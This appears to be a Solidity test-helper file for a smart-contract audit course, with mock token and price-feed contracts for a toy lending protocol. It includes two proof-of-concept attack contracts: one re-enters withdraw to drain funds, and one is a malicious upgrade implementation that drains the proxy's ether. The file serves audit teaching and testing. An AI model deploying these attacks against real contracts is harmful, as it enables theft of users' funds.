// SPDX-License-Identifier: MIT
// 配套章节：audit/R25 实战项目 ｜ 测试公用的本地玩具合约
pragma solidity ^0.8.20;

interface IMiniLend {
    function initialize(address usd, address feed, address owner) external;
    function upgradeTo(address newImpl) external;
    function accrue() external;
    function price() external view returns (uint256);
    function debtOf(address user) external view returns (uint256);
    function maxBorrow(address user) external view returns (uint256);
    function deposit() external payable;
    function borrow(uint256 amt) external;
    function repay(uint256 amt) external;
    function withdraw(uint256 amt) external;
    function liquidate(address user) external;
    function collateral(address user) external view returns (uint256);
    function debtShares(address user) external view returns (uint256);
    function totalDebtShares() external view returns (uint256);
    function owner() external view returns (address);
    function borrowIndex() external view returns (uint256);
}

/// @notice 18 位玩具 USD。余额或额度不足时返回 false，不回滚。
contract ToyUSD {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        if (balanceOf[msg.sender] < amt) return false;
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (balanceOf[from] < amt || allowance[from][msg.sender] < amt) return false;
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice 8 位 Chainlink 风格本地喂价
contract ToyPriceFeed {
    int256 public answer;
    uint256 public updatedAt;

    constructor(int256 _answer) {
        answer = _answer;
        updatedAt = block.timestamp;
    }

    function decimals() external pure returns (uint8) {
        return 8;
    }

    function set(int256 _answer, uint256 _updatedAt) external {
        answer = _answer;
        updatedAt = _updatedAt;
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, answer, updatedAt, updatedAt, 1);
    }
}

/// @notice F-03 重入合约：在 receive 中反复进入 withdraw
contract ReentrantWithdrawer {
    IMiniLend public immutable lend;
    uint256 public amount;

    constructor(IMiniLend _lend) {
        lend = _lend;
    }

    function run() external payable {
        amount = msg.value;
        lend.deposit{value: msg.value}();
        lend.withdraw(msg.value);
    }

    receive() external payable {
        if (address(lend).balance >= amount) lend.withdraw(amount);
    }
}

/// @notice F-02 恶意实现合约，通过 delegatecall 在代理的上下文中运行
contract EvilImplementation {
    function drain(address payable to) external {
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}
